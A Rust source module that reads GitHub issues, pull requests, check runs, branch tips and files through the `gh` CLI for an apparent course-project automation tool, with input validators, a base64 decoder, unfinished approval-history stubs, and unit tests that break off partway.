//! Reads from GitHub: issues, comments, labels and pull requests.
//!
//! Each read runs `gh` through [`Tracker::gh`] and reads its answer, so the real `gh` and the
//! fake are read alike. Ported from the reading half of the runner's `src/tracker/github.ts`,
//! and from `src/tracker/approvalHistory.ts`, the pure half of the approval rule.

use serde::de::DeserializeOwned;

use super::gh::{invalid_argument, one_line, parse_error};
use super::{Tracker, TrackerError};
use crate::factory::lifecycle::approval::{Approval, TextCheck};
use crate::factory::lifecycle::{State, depends_on};
use crate::factory::text::is_commit_id;

// ---------------------------------------------------------------------------------------------
// Shared: running a read and decoding its answer.
// ---------------------------------------------------------------------------------------------

/// Runs a read and decodes its stdout as JSON of the shape `T`; serde's complaint joins
/// `expected`.
pub(crate) fn gh_json<T, G>(gh: &G, args: &[String], expected: &str) -> Result<T, TrackerError>
where
    T: DeserializeOwned,
    G: Tracker + ?Sized,
{
    let stdout = gh.gh(args)?;
    decode(args, expected, &stdout)
}

/// Decodes `text` as JSON of the shape `T`, or the parse error for the call with `args`.
pub(crate) fn decode<T: DeserializeOwned>(
    args: &[String],
    expected: &str,
    text: &str,
) -> Result<T, TrackerError> {
    serde_json::from_str(text).map_err(|error| {
        let why = error
            .to_string()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        parse_error(args, &format!("{expected} ({why})"))
    })
}

/// Runs `gh api --paginate` and collects the rows of every JSON array in stdout: gh prints
/// either one merged array or one array per page.
pub(crate) fn gh_pages<T, G>(
    gh: &G,
    args: &[String],
    expected: &str,
) -> Result<Vec<T>, TrackerError>
where
    T: DeserializeOwned,
    G: Tracker + ?Sized,
{
    let stdout = gh.gh(args)?;
    let pages = split_json_values(&stdout);
    if pages.is_empty() {
        return Err(parse_error(args, &format!("{expected} (output was empty)")));
    }
    let mut rows = Vec::new();
    for page in pages {
        rows.extend(decode::<Vec<T>>(args, expected, page)?);
    }
    Ok(rows)
}

fn is_json_space(c: u8) -> bool {
    matches!(c, b' ' | b'\n' | b'\r' | b'\t')
}

/// Splits text holding several top-level JSON values (`gh --paginate` prints one array per
/// page) into the text of each. Brackets and quotes inside strings do not count. A value that
/// is cut short comes back as is, for the decoder to refuse.
pub(crate) fn split_json_values(text: &str) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut values = Vec::new();
    let mut i = 0;
    loop {
        while i < bytes.len() && is_json_space(bytes[i]) {
            i += 1;
        }
        if i >= bytes.len() {
            return values;
        }
        let start = i;
        let mut depth = 0i64;
        let mut in_string = false;
        while i < bytes.len() {
            let c = bytes[i];
            if in_string {
                if c == b'\\' {
                    i += 1;
                } else if c == b'"' {
                    in_string = false;
                    if depth == 0 {
                        i += 1;
                        break;
                    }
                }
            } else if c == b'"' {
                in_string = true;
            } else if c == b'[' || c == b'{' {
                depth += 1;
            } else if c == b']' || c == b'}' {
                depth -= 1;
                if depth <= 0 {
                    i += 1;
                    break;
                }
            } else if depth == 0 && is_json_space(c) {
                break;
            }
            i += 1;
        }
        let end = i.min(bytes.len());
        // Every boundary above is an ASCII byte, so the slice is on character boundaries.
        values.push(&text[start..end]);
    }
}

/// The arguments of a GraphQL `query` about issue or pull request `number` of `repo`, or the
/// parse error for a repo not written as `owner/name`.
pub(crate) fn issue_query_args(
    repo: &str,
    query: &str,
    number: u64,
) -> Result<Vec<String>, TrackerError> {
    let Some((owner, name)) = repo.split_once('/') else {
        return Err(parse_error(
            &["api".into(), "graphql".into()],
            &format!("a repo written as owner/name, got `{repo}`"),
        ));
    };
    Ok(vec![
        "api".into(),
        "graphql".into(),
        "-f".into(),
        format!("query={query}"),
        "-f".into(),
        format!("owner={owner}"),
        "-f".into(),
        format!("name={name}"),
        "-F".into(),
        format!("number={number}"),
    ])
}

/// `text` quoted for an error message, on one line.
pub(crate) fn quoted(text: &str) -> String {
    format!("\"{}\"", one_line(text))
}

/// Whether `text` is GitHub's uniform UTC form `YYYY-MM-DDTHH:MM:SSZ`, so ordering the text
/// orders the times.
pub fn is_utc_second(text: &str) -> bool {
    let b = text.as_bytes();
    let digits = |range: std::ops::Range<usize>| b[range].iter().all(u8::is_ascii_digit);
    b.len() == 20
        && digits(0..4)
        && b[4] == b'-'
        && digits(5..7)
        && b[7] == b'-'
        && digits(8..10)
        && b[10] == b'T'
        && digits(11..13)
        && b[13] == b':'
        && digits(14..16)
        && b[16] == b':'
        && digits(17..19)
        && b[19] == b'Z'
}

/// Whether an account's login is an instructor's, in ASCII case. A deleted account (none)
/// never is.
pub fn is_instructor(login: Option<&str>, instructors: &[String]) -> bool {
    login.is_some_and(|login| {
        instructors
            .iter()
            .any(|name| name.eq_ignore_ascii_case(login))
    })
}

// ---------------------------------------------------------------------------------------------
// Part A: listings, one issue, blockers, pull requests, checks, branches and files.
// ---------------------------------------------------------------------------------------------

/// How many issues one listing of a label reads; past this the oldest are left out.
pub const LIST_LIMIT: usize = 200;

/// The most a file read through the contents API may be. A project config is a few lines.
pub const MAX_FILE_BYTES: u64 = 64 * 1024;

/// The most issues a `## Depends on` section may name. Each costs a `gh` call on every check,
/// so a longer list is refused rather than read.
pub const MAX_DEPENDS_ON: usize = 100;

/// An open issue in a listing.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueSummary {
    pub number: u64,
    pub title: String,
    pub assignees: Vec<String>,
    /// The label names.
    pub labels: Vec<String>,
}

/// `cut` is set when the listing had more than [`LIST_LIMIT`] items.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Listing<T> {
    pub items: Vec<T>,
    pub cut: bool,
}

/// One issue as `gh issue view` reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueDetail {
    pub number: u64,
    pub title: String,
    /// Empty for an issue with no description.
    pub body: String,
    pub labels: Vec<String>,
    pub assignees: Vec<String>,
    /// The author's login; `None` when GitHub gives none (a deleted account).
    pub author: Option<String>,
    /// The state of the one `factory:*` label; `None` for none, several or an unknown one.
    pub state: Option<State>,
    /// GitHub has the issue closed.
    pub closed: bool,
}

/// An open issue that blocks another one.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Blocker {
    /// `owner/name` of the repo the blocking issue is in.
    pub repo: String,
    pub number: u64,
}

/// Whether GitHub can merge a pull request into its base. GitHub computes it lazily: the read
/// that answers `Unknown` starts the computation, and a later read usually has the answer.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mergeable {
    Mergeable,
    Conflicting,
    Unknown,
}

/// One pull request, as `gh pr view` reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullRequest {
    pub number: u64,
    pub is_draft: bool,
    /// Neither merged nor closed.
    pub open: bool,
    /// Merged into its base.
    pub merged: bool,
    /// The branch the pull request comes from.
    pub head_ref: String,
    /// The head is in a fork, not in this repo.
    pub cross_repository: bool,
    /// The branch the pull request merges into.
    pub base_ref: String,
    /// The commit the head branch points at, as GitHub reports it.
    pub head_sha: String,
    pub mergeable: Mergeable,
    /// When it was opened, as GitHub writes it: `YYYY-MM-DDTHH:MM:SSZ`.
    pub created_at: String,
}

/// An open pull request as a listing gives it. Forks and other bases are listed too: the
/// caller decides which is the factory's own.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct OpenPullRequest {
    pub number: u64,
    pub url: String,
    pub head_ref: String,
    pub base_ref: String,
    pub cross_repository: bool,
    /// The login that opened it; `None` when GitHub names none.
    pub author: Option<String>,
}

/// How one required check stands on a commit: `Passed` when every run completed as `success`
/// or `neutral`, `Failed` when one completed as anything else, `Pending` when a run has not
/// completed, and `Missing` when no run of that name has a result.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CheckState {
    Passed,
    Failed,
    Pending,
    Missing,
}

/// One required check as read for a commit.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CheckStatus {
    /// The name that was asked for.
    pub name: String,
    pub state: CheckState,
    /// What GitHub says about the run that decided `state`: its conclusion when it completed,
    /// its status when it did not, and empty for a check with no run at all.
    pub conclusion: String,
    /// The run's page on GitHub, when it has one.
    pub url: Option<String>,
}

/// The fields `open_pull_requests_on_head` asks `gh pr list` for.
const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";

#[derive(serde::Deserialize)]
struct RawLogin {
    login: String,
}

#[derive(serde::Deserialize)]
struct RawLabel {
    name: String,
}

#[derive(serde::Deserialize)]
struct RawIssueSummary {
    number: u64,
    title: String,
    assignees: Vec<RawLogin>,
    labels: Vec<RawLabel>,
}

#[derive(serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "UPPERCASE")]
enum IssueState {
    Open,
    Closed,
}

#[derive(serde::Deserialize)]
struct RawIssueView {
    number: u64,
    title: String,
    #[serde(default)]
    body: Option<String>,
    labels: Vec<RawLabel>,
    assignees: Vec<RawLogin>,
    state: IssueState,
    #[serde(default)]
    author: Option<RawLogin>,
}

#[derive(serde::Deserialize)]
struct RawBlocker {
    number: u64,
    state: String,
    #[serde(default)]
    repository_url: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawIssueBody {
    #[serde(default)]
    body: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawRestState {
    state: String,
}

#[derive(serde::Deserialize)]
struct RawRepoView {
    #[serde(default)]
    default_branch: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawRefObject {
    sha: String,
    #[serde(rename = "type")]
    kind: String,
}

#[derive(serde::Deserialize)]
struct RawRefView {
    object: RawRefObject,
}

#[derive(serde::Deserialize)]
struct RawPullRequest {
    number: u64,
    #[serde(rename = "isDraft")]
    is_draft: bool,
    state: String,
    #[serde(rename = "headRefName")]
    head_ref_name: String,
    #[serde(rename = "isCrossRepository")]
    is_cross_repository: bool,
    #[serde(rename = "baseRefName")]
    base_ref_name: String,
    #[serde(rename = "headRefOid")]
    head_ref_oid: String,
    mergeable: String,
    #[serde(rename = "createdAt")]
    created_at: String,
}

#[derive(serde::Deserialize)]
struct RawListedAuthor {
    login: String,
    /// `__typename` comes from GraphQL alone: `gh pr list` already writes a bot as `app/<slug>`.
    #[serde(rename = "__typename", default)]
    typename: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawListedPullRequest {
    number: u64,
    url: String,
    #[serde(rename = "headRefName")]
    head_ref_name: String,
    #[serde(rename = "baseRefName")]
    base_ref_name: String,
    #[serde(rename = "isCrossRepository")]
    is_cross_repository: bool,
    #[serde(default)]
    author: Option<RawListedAuthor>,
}

#[derive(serde::Deserialize)]
struct RawCheckRun {
    name: String,
    status: String,
    #[serde(default)]
    conclusion: Option<String>,
    #[serde(default)]
    html_url: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawFileView {
    #[serde(rename = "type")]
    kind: String,
    #[serde(default)]
    encoding: Option<String>,
    size: u64,
    #[serde(default)]
    content: Option<String>,
}

/// Failed beats pending beats missing beats passed: a check passes only when every run passed.
fn check_rank(state: CheckState) -> u8 {
    match state {
        CheckState::Failed => 3,
        CheckState::Pending => 2,
        CheckState::Missing => 1,
        CheckState::Passed => 0,
    }
}

/// The state one check run decides, and the word GitHub gave for it.
fn check_outcome(status: &str, conclusion: Option<&str>) -> (CheckState, String) {
    if status != "completed" {
        return (CheckState::Pending, status.to_string());
    }
    match conclusion {
        Some(word @ ("success" | "neutral")) => (CheckState::Passed, word.to_string()),
        // Nothing ran. The factory's pull request is a draft until the checks pass, and a job
        // guarded by "not a draft" is skipped on it.
        Some("skipped") => (CheckState::Missing, "skipped".to_string()),
        other => (CheckState::Failed, other.unwrap_or("completed").to_string()),
    }
}

/// Standard base64 as GitHub's contents API writes it: wrapped with newlines, padded with `=`.
/// `None` for anything else, including data after padding and padding that does not fit the
/// length.
fn decode_base64(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut bits: u32 = 0;
    let mut have: u32 = 0;
    let mut padding = 0;
    for c in text.chars() {
        let value = match c {
            'A'..='Z' => c as u32 - 'A' as u32,
            'a'..='z' => c as u32 - 'a' as u32 + 26,
            '0'..='9' => c as u32 - '0' as u32 + 52,
            '+' => 62,
            '/' => 63,
            '=' => {
                padding += 1;
                continue;
            }
            '\n' | '\r' => continue,
            _ => return None,
        };
        // Nothing may follow padding.
        if padding > 0 {
            return None;
        }
        bits = (bits << 6) | value;
        have += 6;
        if have >= 8 {
            have -= 8;
            out.push(((bits >> have) & 0xff) as u8);
            bits &= (1 << have) - 1;
        }
    }
    // What is left over is padding bits, which must be zero, and the padding must fit.
    let fits =
        (have == 0 && padding == 0) || (have == 4 && padding == 2) || (have == 2 && padding == 1);
    (fits && bits == 0).then_some(out)
}

/// A branch name as a path under `refs/heads/` in the API; `None` for a name that could leave
/// it.
fn encode_branch(branch: &str) -> Option<String> {
    if !is_branch_path(branch) {
        return None;
    }
    let mut out = String::new();
    for byte in branch.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~' | b'/') {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    Some(out)
}

fn is_plain_segment(part: &str) -> bool {
    part != "."
        && part != ".."
        && !part.is_empty()
        && part
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

/// The open issues with `state`'s label.
pub fn list_issues<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    state: State,
) -> Result<Listing<IssueSummary>, TrackerError> {
    let args = vec![
        "issue".to_string(),
        "list".into(),
        "--repo".into(),
        repo.into(),
        "--state".into(),
        "open".into(),
        "--label".into(),
        state.label().into(),
        "--limit".into(),
        (LIST_LIMIT + 1).to_string(),
        "--json".into(),
        "number,title,assignees,labels".into(),
    ];
    let raw: Vec<RawIssueSummary> = gh_json(gh, &args, "a JSON array of issues")?;
    let cut = raw.len() > LIST_LIMIT;
    let items = raw
        .into_iter()
        .take(LIST_LIMIT)
        .map(|item| IssueSummary {
            number: item.number,
            title: item.title,
            assignees: item.assignees.into_iter().map(|a| a.login).collect(),
            labels: item.labels.into_iter().map(|l| l.name).collect(),
        })
        .collect();
    Ok(Listing { items, cut })
}

/// One issue with its labels, assignees, body, author and state.
pub fn issue<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    number: u64,
) -> Result<IssueDetail, TrackerError> {
    let args = vec![
        "issue".to_string(),
        "view".into(),
        number.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "number,title,body,labels,assignees,state,author".into(),
    ];
    let raw: RawIssueView = gh_json(gh, &args, "an object describing an issue")?;
    let labels: Vec<String> = raw.labels.into_iter().map(|l| l.name).collect();
    let factory: Vec<&String> = labels
        .iter()
        .filter(|name| name.starts_with("factory:"))
        .collect();
    let state = match factory.as_slice() {
        [one] => State::from_label(one),
        _ => None,
    };
    Ok(IssueDetail {
        number: raw.number,
        title: raw.title,
        body: raw.body.unwrap_or_default(),
        assignees: raw.assignees.into_iter().map(|a| a.login).collect(),
        author: raw.author.map(|a| a.login),
        state,
        closed: raw.state == IssueState::Closed,
        labels,
    })
}

/// The open issues GitHub's dependency links say block `issue`.
pub fn open_blockers<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<Vec<Blocker>, TrackerError> {
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/issues/{issue}/dependencies/blocked_by"),
        "--paginate".into(),
    ];
    let listed: Vec<RawBlocker> = gh_pages(gh, &args, "JSON arrays of issues")?;
    let mut open = Vec::new();
    for raw in listed.into_iter().filter(|row| row.state != "closed") {
        // The blocker's repo is named in `repository_url`. Without it the caller would have to
        // guess, so the answer is an error and the issue is not claimed.
        let url = raw.repository_url.unwrap_or_default();
        let named = url
            .find("/repos/")
            .map(|cut| &url[cut + "/repos/".len()..])
            .unwrap_or("");
        let parts: Vec<&str> = named.split('/').collect();
        if parts.len() != 2 || parts[0].is_empty() || parts[1].is_empty() {
            return Err(parse_error(
                &args,
                &format!(
                    "issues that each name their repo in repository_url (#{} did not)",
                    raw.number
                ),
            ));
        }
        open.push(Blocker {
            repo: named.to_string(),
            number: raw.number,
        });
    }
    Ok(open)
}

/// The issues the body's `## Depends on` section names that are not closed.
pub fn text_blockers<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<Vec<Blocker>, TrackerError> {
    let body_args = vec![
        "issue".to_string(),
        "view".into(),
        issue.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "body".into(),
    ];
    let raw: RawIssueBody = gh_json(gh, &body_args, "an object with the issue's body")?;
    let named = depends_on::blockers(raw.body.as_deref().unwrap_or(""));
    if named.len() > MAX_DEPENDS_ON {
        return Err(parse_error(
            &body_args,
            &format!(
                "a Depends on section naming at most {MAX_DEPENDS_ON} issues, got {}",
                named.len()
            ),
        ));
    }
    let mut open = Vec::new();
    for reference in named {
        let named_repo = reference.repo.unwrap_or_else(|| repo.to_string());
        let args = vec![
            "api".to_string(),
            format!("repos/{named_repo}/issues/{}", reference.number),
        ];
        let read: RawRestState = gh_json(gh, &args, "an object with the issue's state")?;
        if read.state != "closed" {
            open.push(Blocker {
                repo: named_repo,
                number: reference.number,
            });
        }
    }
    Ok(open)
}

/// The pull request; `None` for a number the repo does not have.
pub fn pull_request<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    number: u64,
) -> Result<Option<PullRequest>, TrackerError> {
    let args = vec![
        "pr".to_string(),
        "view".into(),
        number.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt"
            .into(),
    ];
    let stdout = match gh.gh(&args) {
        Ok(stdout) => stdout,
        Err(error @ (TrackerError::Other(_) | TrackerError::NotFound { .. }))
            if error
                .to_string()
                .to_lowercase()
                .contains("could not resolve to a pullrequest") =>
        {
            return Ok(None);
        }
        Err(error) => return Err(error),
    };
    let raw: RawPullRequest = decode(&args, "an object describing a pull request", &stdout)?;
    if !is_commit_id(&raw.head_ref_oid) {
        return Err(parse_error(
            &args,
            "a pull request and its full head commit id",
        ));
    }
    if !is_utc_second(&raw.created_at) {
        return Err(parse_error(
            &args,
            "a pull request's creation time as YYYY-MM-DDTHH:MM:SSZ",
        ));
    }
    Ok(Some(PullRequest {
        number: raw.number,
        is_draft: raw.is_draft,
        open: raw.state == "OPEN",
        merged: raw.state == "MERGED",
        head_ref: raw.head_ref_name,
        cross_repository: raw.is_cross_repository,
        base_ref: raw.base_ref_name,
        head_sha: raw.head_ref_oid,
        mergeable: match raw.mergeable.as_str() {
            "MERGEABLE" => Mergeable::Mergeable,
            "CONFLICTING" => Mergeable::Conflicting,
            _ => Mergeable::Unknown,
        },
        created_at: raw.created_at,
    }))
}

/// The open pull requests from a branch named `head`, forks included.
pub fn open_pull_requests_on_head<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    head: &str,
) -> Result<Vec<OpenPullRequest>, TrackerError> {
    if !is_plain_ref_name(head) {
        return Err(invalid_argument(head, "a plain branch name"));
    }
    let args = vec![
        "pr".to_string(),
        "list".into(),
        "--repo".into(),
        repo.into(),
        "--state".into(),
        "open".into(),
        "--head".into(),
        head.into(),
        "--limit".into(),
        "100".into(),
        "--json".into(),
        PR_LIST_FIELDS.into(),
    ];
    let rows: Vec<RawListedPullRequest> = gh_json(gh, &args, "a JSON array of pull requests")?;
    Ok(rows
        .into_iter()
        .map(|node| OpenPullRequest {
            number: node.number,
            url: node.url,
            head_ref: node.head_ref_name,
            base_ref: node.base_ref_name,
            cross_repository: node.is_cross_repository,
            author: match node.author {
                Some(author) if !author.login.is_empty() => {
                    if author.typename.as_deref() == Some("Bot") {
                        Some(format!("app/{}", author.login))
                    } else {
                        Some(author.login)
                    }
                }
                _ => None,
            },
        })
        .collect())
}

/// How each check in `names` stands on the commit `sha`.
pub fn checks<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    sha: &str,
    names: &[String],
) -> Result<Vec<CheckStatus>, TrackerError> {
    if !is_commit_id(sha) {
        return Err(invalid_argument(sha, "a full commit id"));
    }
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/commits/{sha}/check-runs?per_page=100&filter=latest"),
        "--paginate".into(),
        "--jq".into(),
        "[.check_runs[] | {name, status, conclusion, html_url}]".into(),
    ];
    let runs: Vec<RawCheckRun> = gh_pages(gh, &args, "JSON arrays of check runs")?;
    Ok(names
        .iter()
        .map(|name| {
            let mut found: Option<CheckStatus> = None;
            for run in runs.iter().filter(|run| &run.name == name) {
                let (state, conclusion) = check_outcome(&run.status, run.conclusion.as_deref());
                if found
                    .as_ref()
                    .is_none_or(|f| check_rank(state) > check_rank(f.state))
                {
                    // A link that does not point at GitHub is not passed on.
                    let url = run
                        .html_url
                        .as_ref()
                        .filter(|url| url.starts_with("https://github.com/"))
                        .cloned();
                    found = Some(CheckStatus {
                        name: name.clone(),
                        state,
                        conclusion,
                        url,
                    });
                }
            }
            found.unwrap_or_else(|| CheckStatus {
                name: name.clone(),
                state: CheckState::Missing,
                conclusion: String::new(),
                url: None,
            })
        })
        .collect())
}

/// The repo's default branch.
pub fn default_branch<G: Tracker + ?Sized>(gh: &G, repo: &str) -> Result<String, TrackerError> {
    let args = vec!["api".to_string(), format!("repos/{repo}")];
    let view: RawRepoView = gh_json(gh, &args, "an object with the repo's default branch")?;
    match view.default_branch {
        Some(branch) if !branch.is_empty() => Ok(branch),
        _ => Err(parse_error(
            &args,
            "an object with the repo's default branch (it had none)",
        )),
    }
}

/// The full commit id at the tip of `branch`.
pub fn branch_tip<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    branch: &str,
) -> Result<String, TrackerError> {
    let Some(encoded) = encode_branch(branch) else {
        return Err(invalid_argument(
            branch,
            "a branch name without empty or dot segments",
        ));
    };
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/git/ref/heads/{encoded}"),
    ];
    let view: RawRefView = gh_json(gh, &args, "an object with the commit the ref points at")?;
    if view.object.kind != "commit" || !is_commit_id(&view.object.sha) {
        return Err(parse_error(
            &args,
            "a commit and its full 40 or 64 digit id",
        ));
    }
    Ok(view.object.sha)
}

/// The text of the file at `path` in the commit `sha`.
pub fn file_at<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    path: &str,
    sha: &str,
) -> Result<String, TrackerError> {
    if !path.split('/').all(is_plain_segment) {
        return Err(invalid_argument(path, "a plain file path"));
    }
    if !is_commit_id(sha) {
        return Err(invalid_argument(sha, "a full commit id"));
    }
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/contents/{path}?ref={sha}"),
    ];
    let file: RawFileView = gh_json(gh, &args, "an object describing a file")?;
    let bad = |why: &str| parse_error(&args, &format!("a regular file read whole ({why})"));
    if file.kind != "file" {
        return Err(bad("it is not a regular file"));
    }
    if file.size > MAX_FILE_BYTES {
        return Err(bad("it is too big"));
    }
    if file.encoding.as_deref() != Some("base64") {
        return Err(bad("its content did not come as base64"));
    }
    let Some(bytes) = decode_base64(file.content.as_deref().unwrap_or("")) else {
        return Err(bad("its content is not valid base64"));
    };
    if bytes.len() as u64 != file.size {
        return Err(bad("its content is not as long as its size says"));
    }
    String::from_utf8(bytes).map_err(|_| bad("it is not UTF-8"))
}

/// Whether `branch` can be a path under `refs/heads/` in the API: no empty or dot segment.
/// Whether `branch` can be a path under `refs/heads/` in the API: no empty or dot segment.
/// `branch_tip` refuses any other name; a caller that wants its own words for the refusal
/// asks this first.
pub fn is_branch_path(branch: &str) -> bool {
    !branch
        .split('/')
        .any(|part| part.is_empty() || part == "." || part == "..")
}

/// Whether `name` can go into a ref the factory passes to git.
/// Whether `name` can go into a ref the factory passes to git: not empty, not an option, no
/// whitespace or control character, no `..`.
pub fn is_plain_ref_name(name: &str) -> bool {
    !name.is_empty()
        && !name.starts_with('-')
        && !name.contains("..")
        && !name.chars().any(|c| c.is_whitespace() || c.is_control())
}

/// Whether `branch` is only the characters of an ordinary branch name.
/// Whether `branch` can be written into a command a session runs (`git push origin
/// HEAD:<branch>` in a launch message): only the characters of an ordinary branch name, not an
/// option, no `..`. Stricter than [`is_plain_ref_name`], which only keeps a name safe as one
/// argument to git.
pub fn is_safe_branch_name(branch: &str) -> bool {
    !branch.is_empty()
        && branch
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'.' | b'_' | b'-'))
        && !branch.starts_with('-')
        && !branch.contains("..")
}

// ---------------------------------------------------------------------------------------------
// End of part A.
// ---------------------------------------------------------------------------------------------

// ---------------------------------------------------------------------------------------------
// Part B: approval history, issue activity and pull request feedback.
// ---------------------------------------------------------------------------------------------

/// An instructor's comment made during a build.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Comment {
    pub id: String,
    pub author: String,
    pub created_at: String,
    pub body: String,
}

/// An instructor's edit of the issue body: when, by whom, and the whole body as it stands now.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BodyEdit {
    pub edited_at: String,
    pub editor: String,
    pub body: String,
}

/// Why an instructor's comment was not forwarded.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DropReason {
    EditedByOther,
    Unverifiable,
}

/// An instructor's comment that was not forwarded because its text may not be the
/// instructor's.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Dropped {
    pub id: String,
    pub reason: DropReason,
}

/// What the instructors did on an issue since a moment.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Activity {
    /// Oldest first.
    pub comments: Vec<Comment>,
    pub body_edit: Option<BodyEdit>,
    pub dropped: Vec<Dropped>,
}

/// Where a piece of feedback was written. `state` is GitHub's review state.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FeedbackKind {
    Review { state: String },
    PrComment,
    IssueComment,
}

/// A comment a review left on a line of the pull request's diff.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct InlineComment {
    pub path: String,
    /// The line it is on, or was on when the diff changed; `None` when GitHub gives neither.
    pub line: Option<u64>,
    pub body: String,
}

/// One piece of instructor feedback: a review of a pull request, or a comment on it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Feedback {
    /// `review:<id>`, `pr-comment:<id>` or `issue-comment:<id>`, so the id spaces cannot
    /// collide.
    pub id: String,
    pub author: String,
    pub kind: FeedbackKind,
    /// GitHub's UTC form, e.g. `2026-10-04T10:13:16Z`.
    pub created_at: String,
    /// The review's body or the comment's text; empty when there is none.
    pub body: String,
    /// The comments a review left on lines of the diff, in GitHub's order; empty for any other
    /// kind.
    pub inline: Vec<InlineComment>,
    /// How many inline comments of a review were not read; 0 for any other kind.
    pub inline_unread: u64,
}

/// Whether an instructor applied the `factory:ready` label in force, and every edit and
/// rename since was an instructor's.
pub fn approval<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    instructors: &[String],
) -> Result<Approval, TrackerError> {
    let _ = (gh, repo, issue, instructors, issue_query_args, quoted);
    todo!("part B")
}

/// Whether the issue text is as an instructor left it at `since`.
pub fn text_check<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
    instructors: &[String],
) -> Result<TextCheck, TrackerError> {
    let _ = (gh, repo, issue, since, instructors);
    todo!("part B")
}

/// Whether anyone edited the body or renamed the title at or after `since`.
pub fn text_edited_since<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
) -> Result<bool, TrackerError> {
    let _ = (gh, repo, issue, since);
    todo!("part B")
}

/// What the instructors wrote on the issue after `since`.
pub fn activity_since<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
    instructors: &[String],
) -> Result<Activity, TrackerError> {
    let _ = (gh, repo, issue, since, instructors);
    todo!("part B")
}

/// The instructors' feedback on pull request `pr` after `since`, reading back no further than
/// `floor`.
pub fn pr_feedback<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    pr: u64,
    since: &str,
    floor: &str,
    instructors: &[String],
) -> Result<Vec<Feedback>, TrackerError> {
    let _ = (gh, repo, pr, since, floor, instructors);
    todo!("part B")
}

// ---------------------------------------------------------------------------------------------
// End of part B.
// ---------------------------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::factory::github::{Answer, FakeTracker};

    fn args(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|part| part.to_string()).collect()
    }

    #[test]
    fn pages_split_correctly_around_brackets_and_quotes_inside_strings() {
        let pages = "[{\"id\":1,\"body\":\"] [ } \\\" {\"}]\n[{\"id\":3,\"body\":\"s\"}]";
        assert_eq!(
            split_json_values(pages),
            vec![
                "[{\"id\":1,\"body\":\"] [ } \\\" {\"}]",
                "[{\"id\":3,\"body\":\"s\"}]"
            ]
        );
        #[derive(serde::Deserialize)]
        struct Row {
            id: u64,
        }
        let fake = FakeTracker::answering([Answer::ok(pages)]);
        let rows: Vec<Row> = gh_pages(&fake, &args(&["api", "x", "--paginate"]), "rows").unwrap();
        assert_eq!(rows.iter().map(|r| r.id).collect::<Vec<_>>(), vec![1, 3]);
    }

    #[test]
    fn empty_paginated_output_is_a_parse_error() {
        #[derive(Debug, serde::Deserialize)]
        struct Row {}
        let fake = FakeTracker::answering([Answer::ok(" \n")]);
        let error =
            gh_pages::<Row, _>(&fake, &args(&["api", "x"]), "JSON arrays of rows").unwrap_err();
        assert_eq!(
            error.to_string(),
            "`gh api x` returned unexpected output: JSON arrays of rows (output was empty)"
        );
    }

    #[test]
    fn a_utc_second_is_exactly_yyyy_mm_dd_thh_mm_ssz() {
        for good in ["2026-10-04T10:13:16Z", "0000-00-00T00:00:00Z"] {
            assert!(is_utc_second(good), "{good}");
        }
        for bad in [
            "2026-10-04T10:13:16.000Z",
            "2026-10-04T10:13:16+00:00",
            "2026-10-04 10:13:16Z",
            "2026-10-04T10:13:16z",
